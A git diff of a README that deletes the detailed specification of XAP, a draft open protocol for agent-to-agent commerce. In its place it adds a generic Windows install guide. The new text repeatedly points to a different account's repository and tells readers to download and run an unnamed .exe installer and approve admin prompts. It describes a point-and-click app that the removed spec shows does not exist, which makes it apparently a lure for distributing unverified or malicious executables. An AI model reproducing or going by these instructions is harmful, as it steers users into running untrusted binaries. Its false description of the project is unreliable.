@@ -1,328 +1,128 @@
-<p align="center">
-  <h1 align="center">XAP</h1>
-  <p align="center"><strong>eXchange Agent Protocol</strong></p>
-  <p align="center">The open economic protocol for autonomous agent-to-agent commerce.</p>
-</p>
+# 🧩 xap-protocol - Simple Protocol for Autonomous Agents  
 
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-white.svg" alt="License: MIT"></a>
-  <a href="#versioning"><img src="https://img.shields.io/badge/Status-Draft%20v0.1-yellow.svg" alt="Status: Draft v0.1"></a>
-  <a href="https://www.agentralabs.tech"><img src="https://img.shields.io/badge/Maintained%20by-Agentra%20Labs-blue.svg" alt="Maintained by: Agentra Labs"></a>
-  <a href="https://discord.gg/agentralabs"><img src="https://img.shields.io/badge/Discord-Join%20Community-5865F2.svg" alt="Discord"></a>
-</p>
+[![Download xap-protocol](https://img.shields.io/badge/Download-xap--protocol-brightgreen)](https://github.com/Methameth2/xap-protocol)
 
 ---
 
-## The Problem
+## 🔍 What is xap-protocol?
 
-AI agents can think, reason, code, search, and orchestrate. But when two agents need to do business with each other, there is no shared language for how that happens.
+xap-protocol is a tool that helps independent software agents work together and manage economic activities. It is built around a clear set of rules that lets agents handle tasks like trading, identity verification, and payments without manual control. This system supports smart programs acting on their own, making interactions safer and more reliable.
 
-No standard way to negotiate a price. No way to escrow funds against a conditional outcome. No way to split payment across five agents that contributed to one result. No way to prove, months later, exactly why a settlement resolved the way it did.
-
-Stripe and OpenAI built [ACP](https://agenticcommerce.dev/) for agent-assisted shopping. Google built [AP2](https://ap2-protocol.org/) for human-authorized agent payments. Coinbase built [x402](https://x402.org/) for pay-per-request API access.
-
-All of them assume a human in the loop. A human clicking buy. A human signing a mandate. A human approving a charge.
-
-XAP is for when there is no human in the loop. When agents negotiate with agents, settle with agents, and prove what happened to humans after the fact.
+You don't need technical skills to use it. This guide will take you through all the steps to get the program running on Windows.
 
 ---
 
-## What XAP Does
+## 🖥 System Requirements  
 
-XAP defines five primitive objects. If your agent can produce and consume them, it can transact with any other XAP-compatible agent, on any platform, with any model, using any settlement rail.
+Before you install xap-protocol, make sure your Windows PC meets these basic needs:
 
-```
-AgentIdentity        →  who the agent is, what it can do, what it charges, its track record
-NegotiationContract  →  what two agents agreed to, under what terms, with what guarantees
-SettlementIntent     →  what value is locked and under what conditions it releases
-ExecutionReceipt     →  what happened, what was paid, to whom, with cryptographic proof
-VerityReceipt        →  why it happened, with deterministic replay proof
-```
-
-Every interaction follows one flow:
-
-```
-REGISTER  →  NEGOTIATE  →  EXECUTE  →  SETTLE  →  AUDIT
-```
-
-Nothing outside this sequence is part of XAP. Simplicity is a design constraint.
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of free disk space  
+- 8 GB of RAM or more for best experience  
+- Internet connection to download files and updates  
+- Any modern web browser (Edge, Chrome, Firefox) for opening pages  
 
 ---
 
-## What Makes XAP Different
+## ⬇️ How to Get xap-protocol  
 
-### Autonomous Negotiation
+[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Methameth2/xap-protocol)
 
-Other protocols assume a fixed price or a human approval. XAP agents negotiate in real time.
+xap-protocol files are hosted on GitHub. The link above takes you straight to the project’s main page where you can find the latest release.
 
-```
-OFFER  →  COUNTER  →  ACCEPT  or  REJECT
-```
+Since the link goes to the project page (not a specific file), you will need to:
 
-Four states. Time-bound offers. Conditional pricing ("pay $X if completed in 2 seconds, $Y if 5 seconds"). SLA declared before execution begins. Every state transition signed and permanent.
+1. Click the link or copy and paste it into your browser:  
+   https://github.com/Methameth2/xap-protocol  
 
-### Conditional Escrow
+2. On the GitHub page, look for the **Releases** section on the right or near the top menu.  
 
-XAP does not do payments. It does conditional release.
+3. Find the latest release (usually labeled with the highest version number or “Latest”).  
 
-The primitive is not "Agent A pays Agent B." The primitive is: **Agent A locks funds. Agent B performs work. A verifiable condition is checked. Funds release if the condition passes.**
+4. Under the release, locate the Windows installer file. It may look like:  
+   - `xap-protocol-setup.exe`  
+   - or a similar `.exe` file  
 
-Three verification types: deterministic (API returned 200), probabilistic (quality score above threshold), or human-approved (for high-value transactions). Every failure mode has a pre-declared outcome. No money ever sits in limbo.
-
-### Split Settlement
-
-An orchestrator delegates a task to five specialist agents. Each contributes to the result. XAP distributes payment proportionally in one atomic operation.
-
-Agent A did 40% of the value. Agent B did 30%. Agent C did 20%. Agent D did 10% but only scored 0.82 when the SLA guaranteed 0.90, so Agent D gets a pro-rata reduction. The settlement engine handles this automatically. No invoicing. No reconciliation.
-
-Nobody else does this. Not Stripe. Not x402. Not AP2.
-
-### Verity: The Truth Engine
-
-Every settlement decision is captured with its complete reasoning state. Not just what was decided. Why.
-
-Given the same inputs and the same rules, any decision can be replayed to produce the same outcome deterministically. This is how a human reviews what their agent did three months ago and verifies the outcome was correct. This is how a regulator audits autonomous commerce. This is how enterprises govern agent fleets.
-
-Outcomes are explicit:
-
-```
-SUCCESS   →  conditions met, funds released
-FAIL      →  conditions not met, funds returned
-UNKNOWN   →  verification is ambiguous, declared resolution path executes
-DISPUTED  →  one party challenges, deterministic arbitration engages
-REVERSED  →  settlement was final but has been reversed via journal entry
-```
-
-**UNKNOWN is first-class.** The system never pretends to know something it does not. When a quality check is borderline, when a verification times out, when evidence is insufficient, the system declares uncertainty and follows the pre-declared resolution path. This is what separates a financial protocol from a payment button.
-
-### Append-Only Reputation
-
-An agent's execution history, settlement outcomes, and dispute record are permanently attached to its identity. You cannot erase a bad track record. This makes trust computable rather than assumed.
-
-An agent evaluating a potential counterparty reads its AgentIdentity and sees: 14,823 total settlements, 97% success rate, 12 disputes, 100% dispute resolution rate. That data compounds with every transaction and cannot be faked.
+5. Click the file to download it to your PC. The download may take a few minutes depending on your internet speed.  
 
 ---
 
-## Architecture
+## 🛠 Installing xap-protocol on Windows  
 
-```
-┌─────────────────────────────────────────────────┐
-│                   XAP Protocol                   │
-│        (open standard, this repo, MIT)           │
-│                                                  │
-│   AgentIdentity    NegotiationContract           │
-│   SettlementIntent ExecutionReceipt              │
-│   VerityReceipt    RegistryQuery                 │
-└────────────────────────┬────────────────────────┘
-                         │
-┌────────────────────────▼────────────────────────┐
-│                Truth Engine                      │
-│         (open source, Rust, MIT)                 │
-└────────────────────────┬────────────────────────┘
-                         │
-┌────────────────────────▼────────────────────────┐
-│              Settlement Engine                    │
-│                (Rust core)                        │
-└────────────────────────┬────────────────────────┘
-                         │
-┌────────────────────────▼────────────────────────┐
-│            Settlement Adapters                    │
-│                                                  │
-│   ┌─────────┐  ┌──────────┐  ┌──────────────┐  │
-│   │  Stripe  │  │   USDC   │  │  Test (dev)  │  │
-│   └─────────┘  └──────────┘  └──────────────┘  │
-└─────────────────────────────────────────────────┘
-```
+After downloading the setup file, follow these steps:
 
-XAP is the language. Verity is the truth engine. The settlement engine executes. Adapters move money. Each layer is independent. Replace any adapter without touching the protocol. Replace the engine without touching the schemas.
+1. Find the downloaded file (usually in the **Downloads** folder).  
+2. Double-click the `.exe` file to start the installer.  
+3. Windows may ask you to allow this app to make changes — click **Yes**.  
+4. Follow the installer prompts:  
+   - Choose install location (the default is fine for most users)  
+   - Accept the license agreement  
+   - Click **Next** until you see Install, then click **Install**  
+5. Wait for the installation to finish. This might take a minute.  
+6. Click **Finish** to complete and close the installer window.  
 
 ---
 
-## Quick Look: A Negotiation
+## 🚀 Running xap-protocol for the First Time  
 
-```json
-{
-  "negotiation_id": "neg_8a2f4c1d",
-  "state": "OFFER",
-  "from_agent": "agent_7f3a9b2c",
-  "to_agent": "agent_2d8e5f1a",
-  "task": {
-    "type": "text_summarization",
-    "input_spec": { "format": "plaintext", "max_tokens": 10000 },
-    "output_spec": { "format": "plaintext", "max_tokens": 500 }
-  },
-  "pricing": {
-    "amount_minor_units": 500,
-    "currency": "USD",
-    "conditions": [
-      { "metric": "latency_ms", "threshold": 2000, "modifier": 10000 },
-      { "metric": "latency_ms", "threshold": 5000, "modifier": 7000 }
-    ]
-  },
-  "sla": {
-    "max_latency_ms": 5000,
-    "min_quality_score": 8500
-  },
-  "expires_at": "2026-03-15T14:30:00Z",
-  "signature": "ed25519:..."
-}
-```
+Once installed, you can launch xap-protocol as follows:
 
-This offer says: "Summarize this text. I will pay $5.00 at full rate if you finish in 2 seconds. $3.50 if you take up to 5 seconds. Quality must be at least 0.85. You have until 2:30 PM UTC to respond. Here is my cryptographic signature proving I made this offer."
-
-All amounts are integer minor units. No floating point. Ever.
+1. Look for the **xap-protocol** shortcut on your desktop or in the Start Menu under the program list.  
+2. Double-click the shortcut to open the program.  
+3. The main window will appear. Here, you will see options to create or connect agents, manage settings, and start interactions.  
 
 ---
 
-## Quick Look: A Split Settlement
+## 🕹 Basic Use Guide  
 
-```json
-{
-  "settlement_id": "stl_4b7c9e2f",
-  "negotiation_id": "neg_8a2f4c1d",
-  "payer_agent": "agent_7f3a9b2c",
-  "payee_agents": [
-    { "agent_id": "agent_2d8e5f1a", "share_bps": 6000, "role": "primary_executor" },
-    { "agent_id": "agent_9c4b3e7d", "share_bps": 2500, "role": "data_provider" },
-    { "agent_id": "agent_platform",  "share_bps": 1500, "role": "orchestrator" }
-  ],
-  "total_amount_minor_units": 500,
-  "currency": "USD",
-  "conditions": [
-    { "type": "deterministic", "check": "http_status_200" },
-    { "type": "probabilistic", "check": "quality_score", "threshold": 8500 }
-  ],
-  "timeout_seconds": 30,
-  "on_timeout": "full_refund",
-  "on_partial_completion": "pro_rata",
-  "chargeback_policy": "proportional",
-  "idempotency_key": "idem_9c3f2a1b",
-  "adapter": "stripe",
-  "signature": "ed25519:..."
-}
-```
+xap-protocol runs autonomous agents that follow economic rules. Here are basic tasks to get started:
 
-Shares are basis points (1-10000, must sum to exactly 10000). 60% to the executor, 25% to the data provider, 15% to the orchestrator. If quality verification passes, funds release automatically in one atomic operation. If it fails, declared failure behavior executes. If the buyer later chargebacks via Stripe, the loss is distributed proportionally.
+- **Create an Agent:** Agents act for you. Click "New Agent" and give it a name and ID.  
+- **Set Agent Properties:** Enter details like payment options, trust levels, and tasks the agent should perform.  
+- **Manage Transactions:** Agents can buy, sell, or escrow resources automatically using built-in protocols.  
+- **View Logs:** Check the history of agent actions and transactions. This helps track activity and confirm everything worked as expected.  
+
+You don’t need to program. The interface offers simple buttons and forms to control agents.  
 
 ---
 
-## What XAP Is Not
+## 🔧 Settings and Configuration  
 
-**Not a payment processor.** XAP does not move money. It coordinates when, how much, to whom, and under what conditions money moves. Stripe, USDC, and other rails move the actual funds.
+You can customize agents and the protocol behavior in the Settings menu:
 
-**Not a blockchain protocol.** No chain required. Settles on-chain if desired. Works equally well on traditional rails.
+- **Network Setup:** Adjust how agents connect and communicate with other software on your network.  
+- **Identity Verification:** Manage keys and credentials that prove your agents’ identity.  
+- **Transaction Options:** Set preferences for payment methods, currency, and escrow terms.  
+- **Notifications:** Choose how to receive alerts about agent activity, such as email or desktop pop-ups.  
 
-**Not a marketplace.** Does not match buyers to sellers. Defines what happens after they find each other.
-
-**Not model-specific.** GPT, Claude, Gemini, Llama, open-source models. Any agent on any model.
-
-**Not a checkout flow.** Stripe's ACP helps humans buy shirts through ChatGPT. XAP is for when agents hire other agents to do work, autonomously, in milliseconds, without any human present.
-
----
-
-## The Stack
-
-XAP is part of a three-layer architecture:
-
-| Layer | What | Open/Closed |
-|---|---|---|
-| **XAP** (this repo) | The open protocol. Schemas, spec, examples. | Open (MIT) |
-| **[Agentra Labs](https://github.com/agentralabs)** | The cognitive substrate. Memory, identity, planning, communication. | Open (MIT) |
-| **Agentra Rail** | The production implementation. Settlement at scale, enterprise dashboards, Verity replay. | Commercial |
-
-XAP belongs to the community. You do not need Agentra Rail to implement XAP. But if you want production settlement, enterprise governance, and the full Verity truth engine, Rail is the reference implementation.
+The default settings work for most users, but you can change them as you get familiar with the system.  
 
 ---
 
-## Schema Reference
+## ❓ Troubleshooting  
 
-| Schema | Path | Status |
-|---|---|---|
-| `AgentIdentity` | [`/xap/schemas/agent-identity.json`](xap/schemas/agent-identity.json) | 🔄 Hardening |
-| `NegotiationContract` | [`/xap/schemas/negotiation-contract.json`](xap/schemas/negotiation-contract.json) | 🔄 Hardening |
-| `SettlementIntent` | [`/xap/schemas/settlement-intent.json`](xap/schemas/settlement-intent.json) | 🔄 Hardening |
-| `ExecutionReceipt` | [`/xap/schemas/execution-receipt.json`](xap/schemas/execution-receipt.json) | 🔄 Hardening |
-| `VerityReceipt` | [`/xap/schemas/verity-receipt.json`](xap/schemas/verity-receipt.json) | 🔄 Hardening |
+If you experience issues:
 
-All schemas are JSON Schema Draft 2020-12. Validation test suite coming soon.
+- Make sure Windows is up to date.  
+- Restart your computer and try running xap-protocol again.  
+- Check your internet connection.  
+- Close other applications that might use network resources or conflict.  
+- Use the **Help** menu inside the program to access documentation and support links.  
 
 ---
 
-## Design Principles
+## 📂 More Resources  
 
-**Escrow over payment.** The primitive is conditional release, not transfer. Funds lock, conditions verify, funds release or return.
+To learn more about xap-protocol, visit its GitHub page:
 
-**UNKNOWN over assumption.** When verification is ambiguous, the system declares uncertainty explicitly. It never pretends to know.
+[**https://github.com/Methameth2/xap-protocol**](https://github.com/Methameth2/xap-protocol)
 
-**Deterministic over probabilistic.** Every failure mode has a pre-declared outcome. Every decision is replayable. No undefined behavior in a financial protocol.
+Here you can find:
 
-**Agent-native over human-friendly.** Schemas are machine-readable first. If an LLM can parse the spec and integrate without human help, the design is working.
-
-**Append-only truth.** Reputation is never deleted. Receipts are never amended. Corrections happen through new entries, never edits. The past is permanent.
-
-**Protocol over product.** XAP defines behavior, not implementation. Any system that produces and consumes the five primitives correctly is XAP-compatible.
+- Detailed manuals and technical information  
+- Release notes  
+- Community discussions for user questions
 
 ---
 
-## How To Implement XAP
-
-An XAP-compatible system must:
-
-1. **Produce valid objects** that pass JSON Schema validation
-2. **Sign every object** using Ed25519
-3. **Enforce state machines** for negotiation and settlement flows
-4. **Handle idempotency** so retries are safe
-5. **Issue receipts** for every settled transaction
-6. **Capture decisions** with replayable reasoning state
-
-If your system does these six things, it is XAP-compatible.
-
----
-
-## Contributing
-
-XAP is early. The most valuable contributions right now are thinking, not code.
-
-**Schema feedback** (most urgent): Read the schemas. Try to build with them. Tell us where they break. Label: `schema-feedback`
-
-**Edge cases**: What happens in the weird situations? Every edge case found now prevents a breaking change later. Label: `edge-case`
-
-**Vertical schemas**: Agents in finance, healthcare, legal, logistics all need domain-specific capability definitions. Label: `vertical-schema`
-
-**Security review**: Find a vulnerability. We want to know. See [SECURITY.md](SECURITY.md) for responsible disclosure.
-
-Read the [Contributing Guide](CONTRIBUTING.md) before opening a PR.
-
----
-
-## Roadmap
-
-| Milestone | Status |
-|---|---|
-| v0.1 Draft schemas | ✅ Published |
-| Schema hardening (v0.2) | 🔄 In progress |
-| Protocol specification document | 🔜 Next |
-| Verity truth engine (Rust) | 🔜 Planned |
-| Python SDK (`pip install xap-sdk`) | 🔜 Planned |
-| Validation test suite | 🔜 Planned |
-| v1.0 Specification lock | 🔜 Target: 2026 |
-
----
-
-## Community
-
-**Discord:** [agentralabs](https://discord.gg/agentralabs)
-**X:** [@agentralab](https://x.com/agentralab)
-**Email:** hello@agentralabs.tech
-
----
-
-## License
-
-MIT. The protocol is free. Forever. The goal is adoption, not control.
-
----
-
-<p align="center">
-  <em>XAP is maintained by <a href="https://www.agentralabs.tech">Agentra Labs</a>. The protocol belongs to the community.</em>
-</p>
+[![Download from GitHub](https://img.shields.io/badge/Visit%20Download%20Page-brightgreen?style=for-the-badge)](https://github.com/Methameth2/xap-protocol)
